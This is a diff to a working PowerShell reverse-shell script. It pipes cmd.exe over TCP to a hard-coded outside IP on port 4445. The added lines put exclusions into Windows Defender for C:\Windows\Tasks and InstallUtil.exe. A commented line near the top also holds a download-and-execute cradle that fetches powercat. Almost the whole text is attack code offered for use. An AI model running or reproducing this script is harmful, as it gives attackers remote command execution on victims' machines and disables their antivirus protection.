@@ -1,54 +1,92 @@
 # IEX (New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+
+if ((Get-Module -ListAvailable -Name Defender)) {
+    Add-MPPreference -ExclusionPath "C:\Windows\Tasks\"
+    Add-MPPreference -ExclusionProcess "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
+}
+
 function Start-ReverseShell {
     param(
         [string]$AttackerHost,   # Replace with the attacker's IP
         [int]$AttackerPort       # Replace with the attacker's port
     )
 
-    # Setup TCP connection
-    $Socket = New-Object System.Net.Sockets.TcpClient
-    $Socket.Connect($AttackerHost, $AttackerPort)
-    $Stream = $Socket.GetStream()
-    $Writer = New-Object System.IO.StreamWriter($Stream)
-    $Reader = New-Object System.IO.StreamReader($Stream)
+    try {
+        # Setup TCP connection
+        $Socket = New-Object System.Net.Sockets.TcpClient
+        $Socket.Connect($AttackerHost, $AttackerPort)
+        $Stream = $Socket.GetStream()
+        $Writer = New-Object System.IO.StreamWriter($Stream)
+        $Reader = New-Object System.IO.StreamReader($Stream)
 
-    # Setup CMD process
-    $ProcessVars = Setup-CMD @("cmd.exe")
+        # Setup CMD process
+        $ProcessVars = Setup-CMD @("cmd.exe")
 
-    # Main loop to handle interaction
-    while ($true) {
-        # Handle cmd.exe output
-        if ($ProcessVars["StdOutReadOperation"].IsCompleted) {
-            $OutputData, $ProcessVars = ReadData-CMD $ProcessVars
-            if ($OutputData) {
-                $Writer.Write([System.Text.Encoding]::ASCII.GetString($OutputData))
-                $Writer.Flush()
+        # Main loop to handle interaction
+        while ($true) {
+            try {
+                # Check if the stream is still usable
+                if (!$Stream.CanRead -or !$Stream.CanWrite) {
+                    Write-Host "TCP connection closed by remote host."
+                    break
+                }
+        
+                # Handle cmd.exe output
+                if ($ProcessVars["StdOutReadOperation"].IsCompleted) {
+                    $OutputData, $ProcessVars = ReadData-CMD $ProcessVars
+                    if ($OutputData) {
+                        try {
+                            $Writer.Write([System.Text.Encoding]::ASCII.GetString($OutputData))
+                            $Writer.Flush()
+                        } catch {
+                            Write-Host "Failed to send data. Connection might be closed: $_"
+                            break
+                        }
+                    }
+                }
+        
+                # Handle attacker input
+                if ($Stream.DataAvailable) {
+                    $InputData = $Reader.ReadLine()
+                    if ($InputData) {
+                        try {
+                            WriteData-CMD ([System.Text.Encoding]::ASCII.GetBytes($InputData + "`n")) $ProcessVars
+                        } catch {
+                            Write-Host "Failed to write data to CMD process: $_"
+                            break
+                        }
+                    }
+                }
+        
+                # Exit if the process is no longer running
+                if ($ProcessVars["Process"].HasExited) {
+                    Write-Host "CMD process has exited."
+                    break
+                }
+
+                if (!$Socket.Connected -or ($Socket.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead) -and $Socket.Available -eq 0)) {
+                    Write-Host "TCP connection is no longer valid."
+                    break
+                }
+        
+                # Reduce CPU usage
+                Start-Sleep -Milliseconds 10
+            } catch {
+                Write-Host "Error in main loop: $_"
+                break
             }
         }
-    
-        # Handle attacker input
-        if ($Stream.DataAvailable) {
-            $InputData = $Reader.ReadLine()
-            if ($InputData) {
-                WriteData-CMD ([System.Text.Encoding]::ASCII.GetBytes($InputData + "`n")) $ProcessVars
-            }
-        }
-    
-        # Exit if the process is no longer running
-        if ($ProcessVars["Process"].HasExited) {
-            break
-        }
-    
-        # Reduce CPU usage
-        Start-Sleep -Milliseconds 10
+    } catch {
+        Write-Host "Connection terminated or failed: $_"
+    } finally {
+        # Ensure clean-up even on failure
+        if ($ProcessVars) { Close-CMD $ProcessVars }
+        if ($Writer) { $Writer.Close() }
+        if ($Reader) { $Reader.Close() }
+        if ($Stream) { $Stream.Close() }
+        if ($Socket) { $Socket.Close() }
+        Write-Host "Reverse shell terminated."
     }
-
-    # Close the process and connection
-    Close-CMD $ProcessVars
-    $Writer.Close()
-    $Reader.Close()
-    $Stream.Close()
-    $Socket.Close()
 }
 
 # Setup the CMD process
@@ -101,8 +139,11 @@ function WriteData-CMD {
 # Close the CMD process
 function Close-CMD {
     param($FuncVars)
-    $FuncVars["Process"].Kill()
+    if ($FuncVars["Process"] -and !$FuncVars["Process"].HasExited) {
+        $FuncVars["Process"].Kill()
+    }
 }
 
 # Example usage
 Start-ReverseShell -AttackerHost "3.89.198.37" -AttackerPort 4445
+
